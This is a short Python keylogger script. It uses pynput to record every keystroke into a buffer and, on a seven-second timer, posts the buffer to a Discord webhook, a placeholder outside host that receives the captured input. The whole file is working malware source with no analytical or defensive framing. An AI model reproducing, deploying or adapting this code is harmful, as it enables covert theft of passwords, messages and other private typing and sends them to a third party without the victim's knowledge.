from pynput.keyboard import Key, Listener # pip install pynput
import requests # pip install requests
import threading

text = ""
webhook_url = "discord_webhook_url"
time_interval = 7

def send_data():
    data = {
        "content":text,
        "title": "key_logger"
    }
    requests.post(webhook_url,json=data)
    timer = threading.Timer(time_interval,send_data)
    timer.start()


def on_press(key):
    global text
    try:
        if key == Key.space:
            text += " "
        elif key == Key.enter:
            text += "\n"
        elif key == Key.tab:
            text += "\t"
        elif key == Key.backspace:
            text = text[:-1] if text else text
        elif key == Key.esc:
            return False
        else:
            text += key.char  
    except AttributeError:
        text += f" [{key}] "
with Listener(on_press=on_press) as listener:
    send_data()
    listener.join()  
